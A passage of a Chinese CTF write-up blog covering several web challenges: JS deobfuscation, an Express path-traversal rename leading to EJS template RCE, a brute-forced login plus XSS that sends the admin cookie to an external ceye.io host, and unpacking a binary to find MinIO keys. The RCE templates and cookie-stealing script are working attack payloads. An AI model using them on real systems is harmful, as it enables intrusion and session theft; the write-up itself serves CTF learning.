+                    <a href="#level-25-%e5%8f%8c%e9%9d%a2%e4%ba%ba%e6%b4%be%e5%af%b9" aria-label="Level 25 双面人派对">Level 25 双面人派对</a></li>
+                <li>
+                    <a href="#level-38475-%e8%a7%92%e8%90%bd" aria-label="Level 38475 角落">Level 38475 角落</a></li>
+                <li>
+                    <a href="#week2" aria-label="week2">week2</a></li>
+                <li>
+                    <a href="#level-21096-honeypot" aria-label="Level 21096 HoneyPot">Level 21096 HoneyPot</a></li>
+                <li>
+                    <a href="#level-21096-honeypot_revenge" aria-label="Level 21096 HoneyPot_Revenge">Level 21096 HoneyPot_Revenge</a><ul>
+                        
+                <li>
+                    <a href="#%e7%bc%96%e8%af%91%e6%81%b6%e6%84%8fmysql" aria-label="编译恶意Mysql">编译恶意Mysql</a></li></ul>
+                </li>
+                <li>
+                    <a href="#level-60-signinjava" aria-label="Level 60 SignInJava">Level 60 SignInJava</a></li>
+                <li>
+                    <a href="#level-111-%e4%b8%8d%e5%ad%98%e5%9c%a8%e7%9a%84%e8%bd%a6%e5%8e%a2" aria-label="Level 111 不存在的车厢">Level 111 不存在的车厢</a></li>
+                <li>
+                    <a href="#level-257-%e8%90%bd%e7%9a%84%e7%b4%ab%e7%bd%97%e5%85%b0" aria-label="Level 257 ⽇落的紫罗兰">Level 257 ⽇落的紫罗兰</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="week1">week1<a hidden class="anchor" aria-hidden="true" href="#week1">#</a></h3>
+<h3 id="level-24-pacman">Level 24 Pacman<a hidden class="anchor" aria-hidden="true" href="#level-24-pacman">#</a></h3>
+<p>拿到环境</p>
+<p><img alt="image-20250206151704506" loading="lazy" src="../assets/image-20250206151704506.png"></p>
+<p>一个小游戏，猜测应该是js审计</p>
+<p><img alt="image-20250206151846623" loading="lazy" src="../assets/image-20250206151846623.png"></p>
+<p>查看index.js发现代码进行了混淆</p>
+<p>可以用工具反混淆一下，增加一下可读性</p>
+<p><a href="https://tool.yuanrenxue.cn/decode_obfuscator">https://tool.yuanrenxue.cn/decode_obfuscator</a></p>
+<p><img alt="image-20250206152531656" loading="lazy" src="../assets/image-20250206152531656.png"></p>
+<p>反混淆之后找到这个</p>
+<p><img alt="image-20250206152608227" loading="lazy" src="../assets/image-20250206152608227.png"></p>
+<p>感觉是栅栏，解密拿到flag</p>
+<p><img alt="image-20250206152742122" loading="lazy" src="../assets/image-20250206152742122.png"></p>
+<h3 id="level-47-bandbomb">Level 47 BandBomb<a hidden class="anchor" aria-hidden="true" href="#level-47-bandbomb">#</a></h3>
+<p>文件上传</p>
+<p><img alt="image-20250206152938301" loading="lazy" src="../assets/image-20250206152938301.png"></p>
+<p>附件有源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kr">const</span> <span class="nx">multer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;multer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/static&#39;</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;public&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="kr">const</span> <span class="nx">storage</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">.</span><span class="nx">diskStorage</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="nx">destination</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="kr">const</span> <span class="nx">uploadDir</span> <span class="o">=</span> <span class="s1">&#39;uploads&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">uploadDir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">      <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="nx">uploadDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">uploadDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="nx">filename</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">originalname</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="kr">const</span> <span class="nx">upload</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">({</span> 
+</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="nx">storage</span><span class="o">:</span> <span class="nx">storage</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">  <span class="nx">fileFilter</span><span class="o">:</span> <span class="p">(</span><span class="nx">_</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file</span><span class="p">.</span><span class="nx">originalname</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nx">cb</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;无效的文件名&#39;</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">      <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">      <span class="nx">cb</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;文件处理错误&#39;</span><span class="p">),</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">  <span class="kr">const</span> <span class="nx">uploadsDir</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl">  
+</span></span><span class="line"><span class="ln">43</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">uploadsDir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="nx">uploadsDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">
+</span></span><span class="line"><span class="ln">47</span><span class="cl">  <span class="nx">fs</span><span class="p">.</span><span class="nx">readdir</span><span class="p">(</span><span class="nx">uploadsDir</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">files</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mortis&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">files</span><span class="o">:</span> <span class="p">[]</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mortis&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">files</span><span class="o">:</span> <span class="nx">files</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">52</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">54</span><span class="cl">
+</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">56</span><span class="cl">  <span class="nx">upload</span><span class="p">.</span><span class="nx">single</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">57</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">58</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">59</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">61</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;没有选择文件&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">62</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">63</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> 
+</span></span><span class="line"><span class="ln">64</span><span class="cl">      <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;文件上传成功&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">65</span><span class="cl">      <span class="nx">filename</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">filename</span> 
+</span></span><span class="line"><span class="ln">66</span><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="ln">67</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">69</span><span class="cl">
+</span></span><span class="line"><span class="ln">70</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/rename&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">71</span><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">oldName</span><span class="p">,</span> <span class="nx">newName</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">72</span><span class="cl">  <span class="kr">const</span> <span class="nx">oldPath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="nx">oldName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">73</span><span class="cl">  <span class="kr">const</span> <span class="nx">newPath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="nx">newName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">74</span><span class="cl">
+</span></span><span class="line"><span class="ln">75</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">oldName</span> <span class="o">||</span> <span class="o">!</span><span class="nx">newName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">76</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">77</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">78</span><span class="cl">
+</span></span><span class="line"><span class="ln">79</span><span class="cl">  <span class="nx">fs</span><span class="p">.</span><span class="nx">rename</span><span class="p">(</span><span class="nx">oldPath</span><span class="p">,</span> <span class="nx">newPath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">80</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">81</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">82</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">83</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">84</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">85</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">86</span><span class="cl">
+</span></span><span class="line"><span class="ln">87</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">88</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`服务器运行在 http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">89</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>这题有点像24国赛的ezjs</p>
+<p><a href="https://xz.aliyun.com/news/14569">文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区</a></p>
+<p>可以看到在 /rename 路由</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/rename&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">oldName</span><span class="p">,</span> <span class="nx">newName</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="kr">const</span> <span class="nx">oldPath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="nx">oldName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="kr">const</span> <span class="nx">newPath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="nx">newName</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">oldName</span> <span class="o">||</span> <span class="o">!</span><span class="nx">newName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="nx">fs</span><span class="p">.</span><span class="nx">rename</span><span class="p">(</span><span class="nx">oldPath</span><span class="p">,</span> <span class="nx">newPath</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39; &#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>这个路由会将uploads目录中的文件重命名</p>
+<p>我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名</p>
+<p>也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE</p>
+<p>eval.ejs</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div&gt;
+        &lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;) %&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>将ejs上传</p>
+<p><img alt="image-20250206154845681" loading="lazy" src="../assets/image-20250206154845681.png"></p>
+<p>覆写原来的ejs</p>
+<p><img alt="image-20250206155252476" loading="lazy" src="../assets/image-20250206155252476.png"></p>
+<p>访问/</p>
+<p><img alt="image-20250206155341848" loading="lazy" src="../assets/image-20250206155341848.png"></p>
+<p>这题flag藏在环境变量里</p>
+<p>payload:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div&gt;
+        &lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;printenv&#39;) %&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><img alt="image-20250206155810074" loading="lazy" src="../assets/image-20250206155810074.png"></p>
+<h3 id="level-69-mysterymessageboard">Level 69 MysteryMessageBoard<a hidden class="anchor" aria-hidden="true" href="#level-69-mysterymessageboard">#</a></h3>
+<p>密码爆破，XSS cookie窃取</p>
+<p><img alt="image-20250206160024933" loading="lazy" src="../assets/image-20250206160024933.png"></p>
+<p>爆出来 shallot/888888</p>
+<p>登进去看到一个留言板</p>
+<p><img alt="image-20250206160118188" loading="lazy" src="../assets/image-20250206160118188.png"></p>
+<p>猜测是xss，测试一下</p>
+<pre tabindex="0"><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; 
+</code></pre><p><img alt="image-20250206160225628" loading="lazy" src="../assets/image-20250206160225628.png"></p>
+<p>同时通过dirsearch扫到了/admin路由</p>
+<p><img alt="image-20250206160449456" loading="lazy" src="../assets/image-20250206160449456.png"></p>
+<p><img alt="image-20250206160507469" loading="lazy" src="../assets/image-20250206160507469.png"></p>
+<p>根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板</p>
+<p>也就是说我们可以进行cookie窃取</p>
+<p>payload:</p>
+<pre tabindex="0"><code>&lt;script&gt;document.location=&#39;http://dfny33.ceye.io?&#39;+document.cookie;&lt;/script&gt;
+</code></pre><p>将payload输出在留言板，然后访问/admin</p>
+<p><img alt="f01e1737d9537ace6383c2aa28b8be2" loading="lazy" src="../assets/f01e1737d9537ace6383c2aa28b8be2.jpg"></p>
+<p>成功拿到admin的cookie</p>
+<p>拿admin的cookie访问/flag即可拿到flag</p>
+<h3 id="level-25-双面人派对">Level 25 双面人派对<a hidden class="anchor" aria-hidden="true" href="#level-25-双面人派对">#</a></h3>
+<p><img alt="image-20250206161540205" loading="lazy" src="../assets/image-20250206161540205.png"></p>
+<p>这道题有两个环境，一开始以为是re，其实感觉更像是misc</p>
+<p>访问app.service-web可以拿到一个main文件</p>
+<p>是一个elf文件</p>
+<p>用exeinfo PE查到用upx加壳了</p>
+<p><img alt="image-20250206161827725" loading="lazy" src="../assets/image-20250206161827725.png"></p>
+<p>用upx官方工具就可以脱壳</p>
+<p><a href="https://github.com/upx/upx/releases/latest">https://github.com/upx/upx/releases/latest</a></p>
+<p>脱壳之后用ida打开</p>
+<p><img alt="image-20250206162100313" loading="lazy" src="../assets/image-20250206162100313.png"></p>
+<p>可以找到一段关于minio的密钥信息</p>
+<pre tabindex="0"><code>.noptrdata:0000000000D614E0	000000AA	C	minio:\r\n  endpoint: \&#34;127.0.0.1:9000\&#34;\r\n  access_key: \&#34;minio_admin\&#34;\r\n  secret_key: \&#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\&#34;\r\n  bucket: \&#34;prodbucket\&#34;\r\n  key: \&#34;update\&#34; 
+</code></pre><p>那我们大概就能猜到另一个环境应该就是这个minio的服务</p>
+<p>用mc通过Access Key和Secret Key连接上去</p>
+<p><img alt="image-20250206162349506" loading="lazy" src="../assets/image-20250206162349506.png"></p>
+<p>里面有两个储存桶</p>
+<p><img alt="image-20250206162644906" loading="lazy" src="../assets/image-20250206162644906.png"></p>
+<p>将两个储存桶都下载下来</p>
+<p><img alt="image-20250206162716208" loading="lazy" src="../assets/image-20250206162716208.png"></p>
+<p>/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新</p>
+<p>看一下源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">	<span class="s">&#34;level25/fetch&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="s">&#34;level25/conf&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">	<span class="s">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="s">&#34;github.com/jpillora/overseer&#34;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">	<span class="nx">fetcher</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">fetch</span><span class="p">.</span><span class="nx">MinioFetcher</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="nx">Bucket</span><span class="p">:</span>    <span class="nx">conf</span><span class="p">.</span><span class="nx">MinioBucket</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="nx">Key</span><span class="p">:</span>       <span class="nx">conf</span><span class="p">.</span><span class="nx">MinioKey</span><span class="p">,</span>
